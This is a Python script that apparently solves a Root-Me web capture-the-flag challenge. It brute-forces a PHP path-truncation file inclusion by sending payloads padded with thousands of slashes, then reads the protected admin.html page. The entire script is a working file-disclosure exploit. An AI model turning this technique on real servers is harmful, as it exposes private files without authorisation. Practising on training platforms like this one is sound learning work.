from pydoc import html
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

url_base = "http://challenge01.root-me.org/web-serveur/ch35/index.php?page="
success_phrase = "Work in progress"
max_attempts = 500
init_slashes = 4000  # initial slashes to start with

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
})

def check_attempt(i):
    payload = "a/.." + "/" * i + "home.php/."
    full_url = url_base + payload
    try:
        r = session.get(full_url, timeout=5)
        # print(f"[i] Trying with {i} slashes")
        if success_phrase in r.text:
            return i, full_url
    except Exception as e:
        return None
    return None

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_attempt, i) for i in range(init_slashes, init_slashes + max_attempts + 1)]
    for future in as_completed(futures):
        result = future.result()
        if result:
            i, url = result
            print(f"[+] Found valid path, with {i} slashes.")
            print(f"URL: {url}")
            executor.shutdown(wait=False, cancel_futures=True)
            break
    
print("[*] Finished checking paths.")
print("[*] Retrieving admin.html...")

admin_url = url_base + "a/.." + "/" * (i) + "admin.html/."
response = session.get(admin_url)

match = re.search(r'<div id="main">(.*?)<', response.text, re.DOTALL)
if not match:
    print("[-] Failed to retrieve admin.html content.")
if match:
    print(match.group(1).strip())
